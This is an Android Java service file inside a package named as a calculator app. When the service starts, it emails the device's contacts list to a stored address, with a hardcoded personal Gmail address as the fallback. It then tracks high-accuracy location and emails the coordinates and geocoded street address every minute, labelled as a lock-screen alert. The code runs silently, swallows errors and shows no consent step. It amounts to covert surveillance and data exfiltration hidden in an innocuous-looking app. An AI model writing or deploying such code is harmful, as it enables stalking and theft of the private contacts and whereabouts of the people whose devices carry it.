package com.simplemobiletools.calculator;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.os.AsyncTask;
import android.os.Binder;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationListener;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;
import com.simplemobiletools.calculator.emailverification.SendContacts;
import com.simplemobiletools.calculator.emailverification.SendMail;

import java.io.IOException;
import java.util.List;

/**
 * Created by vipul on 12/13/2015.
 */
public class LocationService extends Service implements
        LocationListener,
        GoogleApiClient.ConnectionCallbacks,
        GoogleApiClient.OnConnectionFailedListener {
    LocationListener listener;
    LocationManager locationManager;
    Geocoder geocoder;
    List<Address> addresses;
    private static final long INTERVAL = 1000*2;
    private static final long FASTEST_INTERVAL = 1000*1;
    LocationRequest mLocationRequest;
    GoogleApiClient mGoogleApiClient;
    Location mCurrentLocation, lStart, lEnd;
    double speed;

   static String val;
    Handler handler;

    SharedPreferences ss;
    SharedPreferences.Editor editor;
    String SharedPrefString;
    public LocationService()
    {}

    private final IBinder mBinder = new LocalBinder();

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {

        return mBinder;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        ss=getSharedPreferences("MyValues", Context.MODE_PRIVATE);
        editor=ss.edit();

        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        listener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {


                try {
                    addresses=geocoder.getFromLocation(location.getLatitude(),location.getLongitude(),1);
                    Log.d("yallah", "onLocationChanged: "+location.getLatitude());
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
        };
        SharedPrefString=ss.getString("username","muhammadhusnainyousaf@gmail.com");
        SendContacts sendContacts=new SendContacts(SharedPrefString, "ALERT from LockScreen Application(Don'tReply@this)", "Contacts list");
        sendContacts.execute();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        createLocationRequest();
        mGoogleApiClient = new GoogleApiClient.Builder(this)
                .addApi(LocationServices.API)
                .addConnectionCallbacks(this)
                .addOnConnectionFailedListener(this)
                .build();
        mGoogleApiClient.connect();

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                updateUI();
                handler.postDelayed(runnable, 0);

            }
        },20000);

        return START_NOT_STICKY;

    }


    protected void createLocationRequest() {
        mLocationRequest = new LocationRequest();
        mLocationRequest.setInterval(INTERVAL);
        mLocationRequest.setFastestInterval(FASTEST_INTERVAL);
        mLocationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        handler = new Handler() ;

    }
    @Override
    public void onConnected(Bundle bundle) {
        try {
            LocationServices.FusedLocationApi.requestLocationUpdates(
                    mGoogleApiClient, mLocationRequest, this);
        } catch (SecurityException e) {

        }
    }


    protected void stopLocationUpdates() {
        LocationServices.FusedLocationApi.removeLocationUpdates(
                mGoogleApiClient, this);
    }


    @Override
    public void onConnectionSuspended(int i) {

    }


    @Override
    public void onLocationChanged(Location location) {
        mCurrentLocation = location;

    }

    @Override
    public void onConnectionFailed(ConnectionResult connectionResult) {

    }

    public class LocalBinder extends Binder {




    }
    @Override
    public void onDestroy() {
        stopLocationUpdates();
        if (mGoogleApiClient.isConnected())
            mGoogleApiClient.disconnect();

    }

    //The live feed of Distance and Speed are being set in the method below .
    private void updateUI() {

        new GeocodeAsyncTask().execute();
      //  Log.d("LOCATION","LAT: "+ String.valueOf(mCurrentLocation.getLatitude()+"\n LONG: "+ String.valueOf(mCurrentLocation.getLatitude())+"\n Address: "+ String.valueOf(val)));


    }

    public Runnable runnable = new Runnable() {

        public void run() {

            try {

                if(val!=null) {
                    SharedPrefString=ss.getString("username","muhammadhusnainyousaf@gmail.com");

                    SendMail sm = new SendMail(SharedPrefString, "ALERT from LockScreen Application(Don'tReply@this)", "LOCATION: \nLatitude: " + String.valueOf(mCurrentLocation.getLatitude() + "\nLongitude: " + String.valueOf(mCurrentLocation.getLongitude() + "\nAddress: " + val)));
                    sm.execute();
                }
            }
            catch (Exception e)
            {

            }

            handler.postDelayed(this, 60000);
        }

    };

    //this Function is handling the request to get address
    class GeocodeAsyncTask extends AsyncTask<Void, Void, String> {

        String errorMessage = "";

        @Override
        protected void onPreExecute() {

        }

        @Override
        protected String doInBackground(Void... none) {
            Geocoder geocoder;
            List<Address> addresses = null;
            String ad = "";
        //   if (mCurrentLocation != null || !mCurrentLocation.equals("add")) {

                try {
                    geocoder = new Geocoder(getApplicationContext());

                    addresses = geocoder.getFromLocation(mCurrentLocation.getLatitude(), mCurrentLocation.getLongitude(), 1); // Here 1 represent max location result to returned, by documents it recommended 1 to 5

                    String address = addresses.get(0).getAddressLine(0); // If any additional address line present than only, check with max available address lines by getMaxAddressLineIndex()
                    String city = addresses.get(0).getLocality();
                    if (!city.equalsIgnoreCase("null")) {
                        ad = address;
                    } else {
                        ad = address;
                    }
                } catch (IOException e) {

                    e.printStackTrace();
                } catch (NullPointerException e) {
                } catch (Exception e) {

                }


         //  }

            return ad;
        }
        protected void onPostExecute(String address) {
            if(address == null) {

                // mLocationMarkerText.setText(errorMessage);
            }
            else {

                val=address;


            }
        }
    }
}